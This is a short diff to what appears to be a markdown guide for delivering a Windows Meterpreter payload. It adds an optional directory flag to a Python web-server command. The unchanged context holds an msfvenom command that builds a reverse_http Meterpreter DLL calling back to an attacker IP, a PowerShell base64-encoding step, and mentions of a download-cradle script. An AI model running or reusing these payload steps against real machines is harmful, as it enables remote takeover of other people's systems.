@@ -7,7 +7,7 @@
 ```
 $ msfvenom -p windows/x64/meterpreter/reverse_http lhost=<IP> lport=80 exitfunc=thread -f dll -o shellcode.dll
 
-$ sudo python -m http.server 80
+$ sudo python -m http.server [-d /path/to/directory/] 80
 ```
 
 `$ cat download-cradle.ps1`
@@ -45,7 +45,7 @@ PS /home/user> [IO.File]::WriteAllBytes('shellcode-encodedb64.txt', $encoded)
 
 PS /home/user> exit
 
-$ sudo python -m http.server 80
+$ sudo python -m http.server [-d /path/to/directory/] 80
 ```
 
 `$ cat download-cradle.ps1`
